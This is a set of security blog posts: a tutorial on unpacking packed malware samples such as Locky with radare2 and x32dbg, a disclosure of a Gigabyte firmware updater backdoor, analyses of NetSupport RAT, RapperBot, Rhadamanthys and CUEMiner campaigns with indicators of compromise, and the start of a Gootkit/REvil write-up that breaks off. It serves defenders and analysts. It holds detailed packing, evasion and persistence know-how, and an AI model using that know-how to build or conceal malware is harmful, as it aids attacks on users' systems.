title: Malware Reverse Engineering for Beginners – Part 2 url: https://www.intezer.com/blog/incident-response/malware-reverse-engineering-for-beginners-part-2/ In part 1 of this series, we warmed up and aligned with basic computing terminologies.
We learned the basics of assembly and how to use disassemblers.
All of these tools and techniques are very important for reversing malware samples.
Different sorts of malware have different capabilities and implementations.
As reverse engineers, we need to be familiar with them and be able to identify and understand them. 
Often, malware targeting Windows will be packed and delivered as a second stage.
There are different ways to “deliver” malware to the endpoint.
This blog will cover key concepts and examples regarding how malware is packed, obfuscated, delivered, and executed on the endpoint. 
Here’s what we’ll cover: Basic terms that explain how malware is delivered to endpoints. 
A deep dive on packers – what they are, how they work and how to identify packed samples. 
Following the technical information, we will demonstrate two hands-on analyses of packed malware. 
Basic Terminology for Reverse Engineers to Know An executable file can conceal its true code through either encryption or compression.
When the file is executed, some initial code usually called a stub, decrypts or decompresses the real code so it can be executed.
These tools, that we will describe in this section, can be used by legitimate vendors that want to protect their software from piracy and copyright violations but threat actors also use these tools to evade detection and make the reversing engineering and analysis process harder. 
Now, let’s look at these four tools: a packer, crypter, protector, and a loader. 
What’s a Packer? Packers are often used to compress the payload so it will take less space on disk.
While packers can be used for legitimate purposes, malware developers utilize packers to make the malicious payload smaller and avoid detection based on static malware analysis techniques. 
Examples: UPX is an open-source packing algorithm. 
MPRESS is a free packer. 
Andromeda is a custom packer that makes reverse-engineering more difficult. 
What’s a Crypter? 
Some security tools use signatures or keywords to detect malware.
To avoid detection by these tools, malware developers can use crypters.
A crypter encrypts the payload, so it will be harder for signature-based and standard anti-viruses to detect the malicious payload. 
Examples: PEUNION EXECryptor What’s a Protector? 
For most threat actors, one of the goals they want to achieve is to evade detection, and if the malware is detected then make the analysis process harder for researchers.
That’s where protectors come into the picture – they offer many features that can make static and dynamic analysis tedious and time-consuming.
Having said that, legitimate organizations can use protectors to protect their software from being cracked and manipulated. 
Usually, protectors will encrypt the payload, remove and obfuscate imports, implement anti-debugging and anti-reversing techniques, and much more. Examples: Themida Enigma Protector VMProtect What’s a Loader? 
Packed malware samples are compressed and stored inside the final executable, which will extract and execute the malware.
On the other hand, there are loaders that serve as the first stage of the attack, the payload of the malware can be part of the loader’s file or it can be downloaded from a remote location (by the loader, also known as a Downloader).
In addition, loaders can be used to set persistence and additional components needed for the execution of the malware.
For example, Bazarloader is a sophisticated loader with multiple techniques that is used in attacks against high-profile organizations.
Bazarloader delivers all sorts of threats, from spam to ransomware like Conti or Ryuk. 
In many cases, malware is delivered by tools that implement some (or all) of the functionalities of packers, crypters, protects, and loaders –- all to make the analysis harder.
For example, Morphine has its loader and can encrypt the original file. 
Deep Dive Into How Packers Work and Detection 
Now let’s focus on packers, how they work, how to identify packed files, and how to extract the packed payload that can contain malicious code. 
How do packers work? 
The packed file contains three main components: packed content, a new PE header, and a stub, as seen in the image below: Packed sample view. 
The packers compress (and if it has the functionality of a crypter also encrypts) the original executable, which is saved in one of the sections of the final packed file.
The entry point of the original file is relocated, and so is the Import Address Table (IAT).
The stub is a small part of code that implements the decompression (and decryption) of the originally packed file.
A new PE header is prepended to the packed file or modifies the existing header so it will be a valid executable. 
How to detect packed files 1.
Static detection When data is being compressed or encrypted, the output is not structured and resembles more random data, resulting in high entropy.
In information theory, entropy is a measure of disorder/randomness.
The calculation is done using logarithm with base 2, also known as Shannon entropy, the result is in units of bits, hence the range of entropy level for binary files is 0 to 8. 
We can check the entropy of the file sections, and if one of them has a value of 7 or higher, there is a high probability that the file is packed. 
Packers may change the final payload’s section names, as seen in the screenshot below.
But in most cases, malware authors will rename the sections to more commonly used names that will not give away the fact that the file is packed. 
Multiple tools can be used to detect indicators of a sample being packed: PEstudio, DiE (Detect it Easy), CFF explorer, and more.
There are many examples and tutorials that use these tools, so we will show another free tool that can be handy in this and later stages: radare2. 
Viewing the section of a file (see technical analysis on this packer here). 
Packed samples usually have very few imports as they don’t rely on external libraries like other programs.
When a file has a low number of imports, it strongly indicates that it contains another component that is dropped/loaded.
However, malware developers can add “dummy” imports to mislead researchers. 
Viewing the imports for a packed file; full analysis results here. 
Reverse Engineering Example: Static Unpacking of UPX Packed Samples 
Standard UPX packed samples can be identified by the section names, as long as they were not modified by the attackers.
Let’s take a look at a sample with MD5 5598febfbf00839c9f7047d9fe3205e3. 
The section names of the files contain the UPX string, as seen in the screenshot below: We can use the UPX command line utility to extract the packed payload.
The command to decompress a packed file is as follows: upx -d <packed>
-o <extracted payload> 
You can run the command on the sample and verify that the extracted file has MD5 6d13f5d287fd735a9bbc261aafb49006. 
2.
Dynamic detection When we dynamically analyze a packed file, we aim to extract the payload.
Several functions can be a good place for putting a breakpoint and attempting to fetch the extraction process.
Let’s look at API calls and debuggers. 
API Calls Essentially, all packers need to perform the following operations: allocate memory, change permissions, read the encrypted/packed chunk of code, decrypt it, load it to the allocated memory space and execute it.
To make all of these actions, the program must use system calls because these actions require interaction with the kernel. 
The relevant system calls are VirtualAlloc used for allocating memory in the current process.
The memory is automatically initialized to zero.
One of the arguments is dwSize – that’s the size in bytes.
Knowing the size can help identify when a program allocates big memory space, possibly for the unpacked payload. 
VirtualProtect changes the permissions of the given virtual address.
When malware wants to grant write or execute permissions flNewProtect argument will be set to PAGE_EXECUTE_READWRITE (0x40) or PAGE_EXECUTE_READ (0x20). 
RtlDecompressBuffer decompresses the provided buffer. 
CreateProcessInternalW creates a new process.
In the context of malware execution, it can create a new threat with the malicious unpacked payload. 
We can look for these system calls in the list of imported functions.
However, malware authors usually try to hide these system calls.
For instance, we will not see them in the imported function list, and they not even be part of the strings in the sample.
In this case, the function and the corresponding library are dynamically loaded at runtime – also known as explicit linking. 
In this case, dynamic debugging can be very helpful – debuggers like x64dbg let you put a breakpoint on function calls, even if the function is not imported.
The breakpoint will be triggered if the system call is executed. 
Debugger A debugger is a powerful tool that allows developers and researchers to follow and control the execution of a program.
When debugging an executable, you can view the registers, stack, and memory and see how each instruction affects the stored data. 
Debugging malware can reveal code executed only in runtime (meaning that you will not see it in standard static analysis).
Debuggers also allow you to see how strings and payloads are deobfuscated and constructed – making it easier to find the interesting patterns of the malware. 
Different debuggers can be used to debug Windows executables and DLLs: OllyDbg – not maintained anymore Windbg – powerful kernel-mode and user-mode debugger created by Microsoft. 
x64dbg – reliable and user-friendly.
For 32-bit executables, it’s x32dbg. 
The main difference between these debuggers is the implementation, which may result in certain behaviors, but for the most part, it’s up to you to choose which debugger you prefer. 
There are more tools for debugging (and analyzing) .NET
executables and other Windows executables, but that’s not covered in this blog. 
Reverse Engineering Example:
Extracting Packed Locky Payload In this section, we will present a guide on extracting packed malware from 2 popular malware:
CobaltStrike and Locky.
Make sure to run (and debug) the following examples in an isolated Windows virtual machine. 
You can watch the video of the hands-on unpacking process of Cobalt Strike.
The video shows generation of a Cobalt Strike payload, analysis of the assembly, dynamic execution of the stager to fetch payload, scanning the endpoint for in memory genetic analysis, and parsing the Beacon configuration. 
The analysis of the Locky ransomware is covered in the section below. 
Reverse engineering tools that will be used in these analyses: 
Windows virtual machine x32 debugger Radare2 Command line commands: file, strings, shasum 
In this example, we will inspect a packed sample of Locky ransomware.
While Intezer automatically identifies that the file is packed and extracts the payload for us, we will show how you can manually extract the payload here. 
Static analysis First, we will check the entropy of the section (as we did in the previous example).
We will use radare2.
As seen in the screenshot below, the .rdata section has an entropy level higher than 7, and it’s very unusual for this section to have randomized data.
We can run the strings command on the sample.
The output contains lots of strings that look like a random collection of characters.
At this point, we can assume that the sample is packed, so we will move to dynamic analysis using the x32dbg debugger. 
Dynamic analysis We will use the API calls we covered in the previous section.
Put breakpoints on VirtualAlloc and VirtualProtect. 
bp VirtualAlloc bp VirtualProtect Now, let’s run the file.
It will first stop at the entrypoint, we will hit F9 (continue until next breakpoint – BP), and we will get to the first call to VirtualAlloc.
As seen in the screenshot below, the BP stopped on the call to VirtualAlloc, which is in the Kernel32.dll, and in the stack view (right low corner) we can see the arguments passed to the function.
We can see that the required allocated space is relatively small, so it’s probably not called by the unpacking routine.
So we will continue running the program – hit F9 again. 
It might take a few more hits on the call to VirtualAlloc before we get to a call with the size 0xF41D.
At this point, we want to see where VirtualAlloc was called and what will be stored in the allocated spaces.
So, as shown below, we will ask x32dbg to run to user mode.
We will get to the instruction “ret 10” at this point.
We need to grab the value stored in EAX, which stores the return value of VirtualAlloc. 
In my case, EAX is 0x240000.
We will hit right-click and follow in the dump.
The memory is zeroed out
but if we follow the execution of the code (hitting F8 several times), we will see that the memory contains some values, but they look random.
We can continue running the program until the next hit on the VirtualAlloc call. 
Continue running the program until VirtualAlloc is called with the size: 0x17400 – which is even bigger than the previously allocated buffer.
Then again, hit “run to user code,” or “execute till return” and follow EAX in the dump and step through the use code until you see the allocated memory filled with data that looks like this: The dump contains the unpacked executable – we can identify it by the 0x4D5A (MZ) magic.
In the memory map, right-click the section and hit “Dump memory to file.” 
The MD5 of the extracted payload is e96dad009437ca774035ffd73708bd3e.
We can see in Intezer that, indeed, it’s
Locky ransomware malware. 
Mazal tov!
You have successfully extracted the Locky payload. 
Automating Unpacking for Every File Learning the foundations of reverse engineering is important if it is a skill that you are trying to develop in your career.
But for many security teams, even at large companies, you may not have the time to manually unpack and reverse engineer files on a regular basis.
If you have automated tools that can unpack files and conduct reverse engineering-level analysis, those can ensure that you’re using your time efficiently to focus on threats that require your attention.
Since reverse engineering can be time intensive, you’ll want to only use manual methods for tasks like unpacking after you’ve exhausted your other tools and options. 
Don’t have the time or skills for reverse engineering the volume of packed and obfuscated files your SOC team handles? 
Intezer’s automated alert triage and response process collects files from your endpoint security solution (like CrowdStrike, Microsoft Defender, or SentinelOne) to identify packed files, extract the payload, and then respond autonomously or with the results Intezer provides for remediation. 
To see how Intezer handles reverse engineering tasks for every alert, book a demo here. 
The post Malware Reverse Engineering for Beginners – Part 2 appeared first on Intezer. 
title: Supply Chain Risk from Gigabyte App Center Backdoor - Eclypsium | Supply Chain Security for the Modern Enterprise url: https://eclypsium.com/blog/supply-chain-risk-from-gigabyte-app-center-backdoor/ Recently, the Eclypsium platform began detecting suspected backdoor-like behavior within Gigabyte systems in the wild.
These detections were driven by heuristic detection methods, which play an important role in detecting new, previously-unknown supply chain threats, where legitimate third-party technology products or updates have been compromised.
Our follow-up analysis discovered that firmware in Gigabyte systems is dropping and executing a Windows native executable during the system startup process, and this executable then downloads and executes additional payloads insecurely.
It uses the same techniques as other OEM backdoor-like features like Computrace backdoor (a.k.a. LoJack DoubleAgent) abused by threat actors and even firmware implants such as Sednit LoJax, MosaicRegressor, Vector-EDK.
Subsequent analysis showed that this same code is present in hundreds of models of Gigabyte PCs.
We are working with Gigabyte to address this insecure implementation of their app center capability. 
In the interest of protecting organizations from malicious actors, we are also publicly disclosing this information and defensive strategies on a more accelerated timeline than a typical vulnerability disclosure.
This backdoor appears to be implementing intentional functionality and would require a firmware update to completely remove it from affected systems.
While our ongoing investigation has not confirmed exploitation by a specific threat actor, an active widespread backdoor that is difficult to remove poses a supply chain risk for organizations with Gigabyte systems.
At a high level, the relevant attack vectors include: Compromise in the supply chain Compromise in the local environment Malware persistence via functionality of this firmware in systems A more detailed analysis of these risks is provided with suggested mitigations below.
After a more traditional vulnerability disclosure timeline, we plan to publish details about how this works. 
Key Findings There are two important aspects of our findings: Eclypsium automated heuristics detected firmware on Gigabyte systems that drops an executable Windows binary that is executed during the Windows startup process. 
This executable binary insecurely downloads and executes additional payloads from the Internet. 
Since many more issues like this continue to be discovered, Eclypsium is continuously running at-scale analysis of the information technology supply chain.
Look for additional findings on this blog and the Eclypsium Platform for your organization. 
Stage 1:
Firmware dropping OS executable An initial analysis of the affected UEFI firmware identified the following file: 8ccbee6f7858ac6b92ce23594c9e2563ebcef59414b5ac13ebebde0c715971b2.bin 
This is a Windows Native Binary executable embedded inside of UEFI firmware binary in a UEFI firmware volume with the following GUID: AEB1671D-019C-4B3B-BA-00-35-A2-E6-28-04-36. 
This Windows executable is embedded into UEFI firmware and written to disk by firmware as part of the system boot process, a technique commonly used by UEFI implants and backdoors.
During the Driver Execution Environment (DXE) phase of the UEFI firmware boot process, the “WpbtDxe.efi” firmware module uses the above GUID to load the embedded Windows executable file into memory, installing it into a WPBT ACPI table which will later be loaded and executed by the Windows Session Manager Subsystem (smss.exe) upon Windows startup.
The “WpbtDxe.efi” module checks if the “APP Center Download & Install” feature has been enabled in the BIOS/UEFI Setup before installing the executable into the WPBT ACPI table.
Although this setting appears to be disabled by default, it was enabled on the system we examined. 
This executable uses the Windows Native API to write the contents of an embedded executable to the file system at the following location: 
%SystemRoot%\system32\GigabyteUpdateService.exe It then sets registry entries to run this executable as a Windows Service.
The mechanism described here is similar to the methods used by other UEFI firmware implants such as LoJax, MosiacRegressor, MoonBounce, and Vector-EDK, referenced previously. 
Stage 2: Downloading and running further executables 
The dropped Windows executable is a .NET application.
It downloads and runs an executable payload from one of the following locations, depending on how it’s been configured: http://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://software-nas/Swhttp/LiveUpdate4 Plain HTTP (the first bullet above) should never be used for updating privileged code as it is easily compromised via Machine-in-the-middle (MITM) attacks.
However, we noticed that even when using the HTTPS-enabled options, remote server certificate validation is not implemented correctly.
Therefore, MITM is possible in that case also. 
The firmware does not implement any cryptographic digital signature verification or any other validation over the executables.
The dropped executable and the normally-downloaded Gigabyte tools do have a Gigabyte cryptographic signature that satisfies the code signing requirements of Microsoft Windows, but this does little to offset malicious use, especially if exploited using Living-off-the-Land techniques (like in the recent alert regarding Volt Typhoon attackers).
As a result, any threat actor can use this to persistently infect vulnerable systems either via MITM or compromised infrastructure. Risks and Impact These issues expose organizations to a wide range of risks and attack scenarios. 
Abuse of an OEM backdoor by threat actors – Previously, threat actors have taken advantage of legitimate but insecure/vulnerable “OEM backdoor” software built into the firmware of PCs.
Most notably, Sednit group (APT28, FancyBear) exploited Computrace LoJack to masquerade as legitimate laptop anti-theft feature. 
Compromise of the OEM update infrastructure and supply chain – Gigabyte does have documentation on their website for this feature so it may be legitimate, but we cannot confirm what is happening within Gigabyte.
In August 2021, Gigabyte experienced a breach of critical data by the RansomEXX group and then experienced another breach in October 2021 by the AvosLocker group. 
Persistence using UEFI Rootkits and Implants – UEFI rootkits and implants are some of the stealthiest and most powerful forms of malware in existence.
They reside in firmware on motherboards or within EFI system partitions of storage media, and execute before the operating system, allowing them to completely subvert the OS and security controls running in higher layers.
Additionally, since most of the UEFI code exists on the motherboard instead of storage drives, UEFI threats will easily persist even if drives are wiped and the OS is reinstalled.
The rate of discovery of new UEFI rootkits has accelerated sharply in recent years as seen by the discovery of LoJax (2018), MosaicRegressor (2020), FinSpy (2021) ESPecter (2021), MoonBounce (2022), CosmicStrand (2022), and BlackLotus (2023).
Most of these were used to enable persistence of other, OS-based malware.
This Gigabyte firmware images and the persistently dropped Windows executable enable the same attack scenario.
Often, the above implants made their native Windows executables look like legitimate update tools.
In the case of MosaicRegressor, the Windows payload was named “IntelUpdater.exe” MITM attacks on firmware and software update features – Additionally, the insecure nature of the update process opens the door to MITM techniques via a compromised router, compromised device on the same network segment, DNS poisoning, or other network manipulation.
It is also important to note that the third connection option, https://software-nas/Swhttp/LiveUpdate4 , is not a fully qualified domain name, but rather, a machine name that would presumably be on the local network.
This means an attacker on a local subnet could trick the implant into connecting to their system, without the need for DNS spoofing. 
Ongoing risk due to unwanted behavior within official firmware – Backdoors hidden within UEFI or other firmware can be hard to remove.
Even if the backdoor executable is removed, the firmware will simply drop it again the next time the system boots up.
This challenge was demonstrated before when trying to remove Computrace LoJack and relates to vulnerabilities in Lenovo Service Engine on notebooks and desktops. 
Recommendations We recommend exercising caution when using Gigabyte systems or systems with affected motherboards.
Organizations can also take the following actions to minimize the risk: Scan and monitor systems and firmware updates in order to detect affected Gigabyte systems and the backdoor-like tools embedded in firmware.
Update systems to the latest validated firmware and software in order to address security issues like this one. Inspect and disable the “APP Center Download & Install” feature in UEFI/BIOS Setup on Gigabyte systems and set a BIOS password to deter malicious changes. 
Administrators can also block the following URLs: http://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://software-nas/Swhttp/LiveUpdate4 Researchers at Eclypsium Labs are continuing to investigate for any signs of malicious activity related to this discovery.
We will provide additional updates as new information becomes available.
For more information or assistance contact Eclypsium at [email protected]. 
A list of affected models is available here. 
title: Gotta Catch ‘Em All | Understanding the NetSupport RAT Campaigns Hiding Behind Pokemon Lures url: https://www.sentinelone.com/blog/gotta-catch-em-all-understanding-the-netsupport-rat-campaigns-hiding-behind-pokemon-lures/ Researchers at ASEC recently reported on a NetSupport RAT campaign that utilizes Pokemon as the social engineering lure.
Threat actors staged a malicious website, hosting a Pokemon-based NFT game, offering both a fun and financially rewarding experience.
In reality, those drawn into the site are coerced into downloading the trojanized NetSupport RAT client, allowing attackers full access to their device. 
NetSupport RAT has been observed in numerous attacks on enterprise environments over the years, and Pokemon is just the latest in a long line of creative lures used to distribute and drop NetSupport RAT.
It is frequently used by cybercriminals as a ‘quick solution’ in lieu of implementing something more bespoke. 
In this post, we provide an overview of NetSupport RAT and discuss the technical details of a recent campaign. 
Background NetSupport RAT is based on NetSupport Manager, a legitimate tool which is frequently used by bad actors for malicious purposes in ways similar to TeamViewer.
NetSupport Manager, used maliciously or otherwise, provides full and complete control over the target device.
Once the client has been installed, attackers can access, acquire, and manipulate any data on the device (exfiltrate data, execute additional payloads).
In addition, the software allows at least the following: Real-time screen monitoring, optimized for monitoring multiple devices Taking control or redirect user screens Capturing screenshots, audio, video Malicious versions are constantly being sold or rented out via underground crime marketplaces. 
NetSupport Manager RAT offered for rental As NetSupport Manager is a legitimate tool that has a long history of development, it is highly attractive to attackers as it can be relied on to work ‘out of the box’.
Additionally, it is thoroughly documented and actively supported: benefits that are less likely with custom-built malware that provides similar functionality such as Andromeda, Nanocore, CirenegRAT, Dark Comet and others. 
Malicious use of NetSupport Manager (aka NetSupport RAT) has been observed since at least late 2017.
The use of “legitimate” or COTS (Commercial off the Shelf) tools is highly beneficial to attackers when attempting to achieve the greatest degree of stealth.
Custom-written malware can often be detected by some layer of protection, such as EPP and EDR tools, so it is often advantageous to utilize a legitimate tool, even if it takes some creativity to deliver the remote software client. 
ASEC reported that the NetSupport RAT droppers were delivered via phishing emails that entice targets to install a “Pokemon card game”.
On doing so, the victim unknowingly installs the NetSupport RAT, a doctored version of the NetSupport Manager client (client32.exe) that gives the attacker immediate and direct control of the infected device.
While this specific attack was centered around the Pokemon theme, other phishing lures are known to be used. 
Some recent NetSupport RAT campaigns utilize .ISO
files as droppers.
This allows the attackers to evade certain types of detection.
This technique has been used by ransomware actors as well such as by both Maze and Ragnar Locker. 
When opened, the ISO files will contain either the NetSupport RAT installer (with configs/support files) or a .LNK file redirecting the victim to said installer. 
Technical Details A typical example of this kind of .ISO file is the sample CLF_security.iso (288603f501926756c236e368a1fdc7d128f4f9a1). 
This particular .ISO contains an embedded .EXE file (CLFSECUR.EXE) which is then utilized to drop and execute the installer for NetSupport RAT. 
Sample 4233ff7941da62b86fc2c2d92be0572c9ab534c8 has been observed in multiple ISO files masquerading as legitimate software, including: CodeTwo Exchange Manager PCFresh 2022 SDK Tools Google Chrome Google Crash Handler Steelray Project Setup BrowserRenew.iso CLFsecurity.
ISO Cloudflare_security_setup.iso The RAT installation is disguised to look similar to a Google Chrome installation. 
NetSupport RAT installer disguised as Google Chrome setup. 
The sample is obfuscated via the Babadeda crypter.
When executed, a base64 encoded string is used to specify various parameters including sessionID and other critical values to the NetSupport connection. 
Base64 encoded RAT execution command The command decodes to look similar to the following: NetSupport RAT decoded command Persistence for the RAT is achieved via registry entry, and a shortcut to the installed RAT executable is written to the Startup folder.
For example: ~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NetSupport.url In this case, the shortcut links to \AppData\Roaming\Steelray
Project Viewer
.
In addition, the sample generates a scheduled task with multiple triggers. 
NetSupport RAT Persistence via Scheduled Task Install directory of NetSupport RAT The RAT performs a number of discovery operations to understand its host environment.
Network adapter details are pulled via GetAdaptersAddresses.
Additional data is gleaned via WMI queries such as: SELECT *
FROM Win32_ComputerSystem SELECT *
FROM Win32_SystemEnclosure 
The malware deploys some anti-analysis measures such as attempting to detect the presence of a debugger via IsDebuggerPresent, and all running processes are enumerated and logged via EnumProcesses (32-bit processes).
Launch behavior, including delays in execution or outgoing connection, can be controlled by the attacker.
For example, Sleep statements may be used to delay execution by hours in order to trick sandboxes used in malware analysis or simply to disguise the association between the infection and the social engineering event from the user. 
Network requirements vary across different NetSupport Manager configurations and sessions.
In the analyzed sample, the client opens a port on TCP 50275 to receive network connections. 
NetSupport RAT has the ability to drop and execute additional components.
In this particular campaign, system/log data and executable code is dropped into %temp%. 
NetSupport RAT data in %temp%. 
Data files and executables are also written to ~\Program Files (x86) \Google\Temp.
These files are all self-deleted after launch or full installation of the attacker configuration.
A large number of legitimate Google Chrome support files are also written to this location.
These are used by the malware in order to facilitate the fake Google Chrome installation. 
Conclusion NetSupport Manager is a long-standing tool which, like TeamViewer, has unfortunately attracted ample use by cybercriminals.
NetSupport RAT, once installed, is very robust and powerful, and threat actors are able to masquerade the dropper or installer in any way they see fit.
In addition, threat actors using this tool are very quick to update their lures and find ways to entice their victims into installing the malicious remote control software. 
SentinelOne Singularity provides protection against malicious behaviors associated with NetSupport RAT. Indicators of Compromise SHA1 Samples 593966f38d6b062bec8534ec070a194ac3a3c3d8 3a511941b09fdfed1b53bd89e55be7a3211b19c2 16cf01d8e0753e4b6fac781266d033996af6731d f1c454645ab0adec41765f29861a5b5dd9bda313 0ef99e15452154c240f80c874384d04c46b154a0 ec7e8093b8d35a0e6fbf7b1869d685f0be0e8108 dfc9b696267ae466c6ffa44e63e314df79264afd 4c5771b7fb683b160cb1f7396d39dd706aa7021d ee3c0579cbcdb5f50ff8cd750a59d89d7757d7a4 288603f501926756c236e368a1fdc7d128f4f9a1 06906aee0ddba30e560e4b60e140e0c098519bb2 7c090065de1090fa92ff01f06739fbca04e6936d 61679dbe1d13d9c25000142fd51b9f4e952a7098 2d6b1900e093c9c8bcce642792e3fadc90b3b0ac 171692daf0a136154edde6e22c791d238ae8c1d0 4233ff7941da62b86fc2c2d92be0572c9ab534c8 DNS/Domains she32rn1[.]com MITRE ATT&CK T1219 – Remote Access Software T1053.005 – Scheduled Task/Job: Scheduled Task T1047 – Windows Management Instrumentation T1564.001 – Hide Artifacts: Hidden Files and Directories T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1564.003 –
Hide Artifacts: Hidden Window T1036 – Masquerading T1112 – Modify Registry T1406.002 – Obfuscated Files or Information: Software Packing T1049 – System Network Connections Discovery T1083 – File and Directory Discovery T1057 – Process Discovery T1012 – Query Registry T1571 – Non-Standard Port 
title: Uncommon infection methods—part 2 url: https://securelist.com/crimeware-report-uncommon-infection-methods-2/109522/ Introduction 
Although ransomware is still a hot topic on which we will keep on publishing, we also investigate and publish about other threats.
Recently we explored the topic of infection methods, including malvertising and malicious downloads.
In this blog post, we provide excerpts from the recent reports that focus on uncommon infection methods and describe the associated malware. 
For questions or more information on our crimeware reporting service, please contact crimewareintel@kaspersky.com. 
RapperBot: “intelligent brute forcing” RapperBot, based on Mirai (but with a different C2 command protocol), is a worm infecting IoT devices with the ultimate goal to launch DDoS attacks against non-HTTP targets.
We observed the first sample in June 2022, when it was targeting SSH and not Telnet services.
The latest version, however, removed the SSH functionality part and now focuses exclusively on Telnet—and with quite some success.
In Q4 2022, we noticed 112k RapperBot infection attempts coming from over 2k unique IP addresses. 
What sets RapperBot apart from other worms is its “intelligent” way of brute forcing: it checks the prompt and, based on the prompt, it selects the appropriate credentials.
This method speeds up the brute forcing process significantly because it doesn’t have to go over a huge list of credentials. 
RapperBot then determines the processor architecture and infects the device.
The downloading of the actual malware is done via a variety of possible commands (for example, wget, curl, tftp and ftpget).
If for some reason these methods don’t work, then a malware downloader is uploaded to the device via the shell “echo” commands. 
Rhadamanthys: malvertising on websites and in search engines Rhadamanthys is a new information stealer first presented on a Russian-speaking cyber criminal forum in September 2022 and offered as a MaaS platform.
According to the author, the malware: Is written in C/C++, while the C2 is written in Golang. 
Is able to do a “stealthy” infection. 
Is able to steal/gather information on CPU type, screen resolution, supported wallets, and so on. 
Evades EDR/AV. Has encrypted communication with the C2. 
Despite the malware being advertised already in September 2022, we started to detect the first samples at the beginning of 2023.
Although Rhadamanthys was using phishing and spam initially as the infection vector, the most recent method is malvertising. 
Online advertising platforms offer advertisers the possibility to bid in order to display brief ads in search engines, such as Google, but also websites, mobile apps and more.
Both search engine and website-based ad platforms are leveraged by Rhadamanthys.
The trick they pull is to display ads representing legitimate applications but in fact containing links to phishing websites.
These phishing websites contain fake installers, luring users into downloading and installing the malware. 
While analyzing Rhadamanthys, we noticed a strong connection with Hidden Bee miner.
Both samples use images to hide the payload inside and both have similar shellcodes for bootstrapping.
Additionally, both use “in-memory virtual file systems” and utilize Lua to load plugins and modules. Comparison between Rhandamanthys’s “prepare.bin” and Hidden Bee’s “preload” modules CUEMiner: distribution through BitTorrent and OneDrive In August 2021, a project was started on GitHub called SilentCryptoMiner, hosting the miner consisting of a downloader and the payload, bot source and the compiled builder, as well as additional software, such as a system watcher.
It has been constantly updated, with the latest update going back to October 31 2022.
The repository is popular with cybercriminals, as illustrated by the huge number of samples we detected that featured many small changes and were combined with the different URLs and TTPs, making it clear that the malware is used by multiple groups in various ways concurrently. 
During our investigation, we noticed two methods of spreading the malware.
The first is via trojanized cracked software downloaded via BitTorrent.
The other method is via trojanized cracked software that is downloaded from OneDrive sharing networks.
How victims are lured into downloading these cracked packages is speculation, because we couldn’t find any direct links.
Nevertheless, many crack sites these days do not immediately provide downloads.
Instead, they point to Discord server channels for further discussion.
This suggests some form of human interaction and social engineering. 
The downloader is written in .NET and called CUEMiner.
Despite being written in .NET, it is wrapped by a C++ based dropper and it connects to a set of URLs, which is varying from sample to sample, to download the miner and configuration settings.
It also performs several checks in order to ensure it is running on bare metal systems, and not on a virtual machine.
In case all checks are passed, the malware: Reconfigures Windows Defender to exclude the user profile path and the entire system drive from scanning. 
Fetches configuration details from a hardcoded URL and saves it at different places (for example, c:\logs.uce, %localappdata%\logs.uce). 
Creates empty files and subdirectories in %ProgramData%\HostData to make the directory look benign. 
Downloads the miner and watcher. 
Does a number of other things.
The full list you can find in our private report. 
The watcher, as the name suggests, monitors the system.
If it doesn’t detect any processes that consume lots of system power (for example, games), the miner software is launched.
When a heavy process, such as a game, is started, the miner is stopped and only started again when the aforementioned process stops.
This is done in order to stay undetected on the system longer. 
Conclusion Open source malware is often used by less skilled cybercriminals.
They often lack the required skills and contacts to conduct massive campaigns.
Nevertheless, they can be still quite active and effective, as is shown by the huge number of CUEMiner samples we detected.
If along their cybercriminal career they gain more skills, such as programming and understanding security better, they often reuse and improve crucial source code parts from open source malware. 
Code reuse and rebranding is also used quite often by cybercriminals.
There are many ransomware variants that change names over time while mostly containing the same code base.
In other cases, cybercriminals re-use parts of the code in new campaigns.
For example, Rhadamantys stealer features some code overlaps with the Hidden Bee malware.
This suggests involvement of at least one individual in the Rhadamantys campaign who had also been involved in the development of Hidden Bee. 
To protect yourself against these threats, intelligence reports can help.
If you want to stay up to date on the latest TTPs used by criminals or have questions about our private reports, please contact crimewareintel@kaspersky.com. 
title: German users targeted with Gootkit banker or REvil ransomware url: https://blog.malwarebytes.com/threat-analysis/2020/11/german-users-targeted-with-gootkit-banker-or-revil-ransomware/ This blog post was authored by Hasherezade and Jérôme Segura 
On November 23, we received an alert from a partner about a resurgence of Gootkit infections in Germany.
Gootkit is a very capable banking Trojan that has been around since 2014 and possesses a number of functionalities such as keystroke or video recording designed to steal financially-related information. 
In this latest campaign, threat actors are relying on compromised websites to socially engineer users by using a decoy forum template instructing them to download a malicious file. 
While analyzing the complex malware loader we made a surprising discovery.
Victims receive Gootkit itself or, in some cases, the REvil (Sodinokibi) ransomware.
The decision to serve one or the other payload happens after a check with the criminal infrastructure. 
Gootkit attacks observed in Germany Security researcher TheAnalyst was the first to publicly identify an active campaign in November using a sophisticated loader that was eventually attributed to Gootkit, a banking Trojan not observed in the wild for some time.
Germany’s Computer Emergency Response Team CERT-Bund later confirmed that German users were being targeted via compromised websites. 
Around the same time, we started receiving reports from some of our partners and their ISPs about Gootkit-related traffic.
We were able to confirm Gootkit detections within our telemetry that were all located in Germany. 
Figure 1: Gootkit infections in Germany in the wake of the campaign After a couple of days, we remediated over 600 unique machines that had been compromised. 
Fake forum template on hacked websites The initial loader is spread via hacked websites using an interesting search engine optimization (SEO) technique to customize a fake template that tries to trick users to download a file. 
The template mimics a forum thread where a user asks in German for help about a specific topic and receives an answer which appears to be exactly what they were looking for.
It’s worth noting that the hacked sites hosting this template are not German (only the template is); they simply happen to be vulnerable and are used as part of the threat actor’s infrastructure. 
Figure 2: Compromised site loads decoy template to trick victims This fake forum posting is conditionally and dynamically created if the correct victim browses the compromised website.
A script removes the legitimate webpage content from the DOM and adds its own content (the template showing a link to a file to download). 
Figure 3: A view of the HTML code behind the decoy template There is a server-side check prior to each visit to the page to determine if the user has already been served the fake template or not, in which case the webserver will return legitimate content instead. 
Fileless execution and module installation 
The infection process starts once the victim executes a malicious script inside the zip archive they just downloaded. 
Figure 4: Malicious script, heavily obfuscated This script is the first of several stages that leads to the execution of the final payload.
The following diagram shows a high level overview: Figure 5: Infection flow Stage 1 – The first JavaScript The first JavaScript is the module that has to be manually executed by the victim, and it has been obfuscated in order to hide its real intentions.
The obfuscation consists of three layers where one decodes content for the next. 
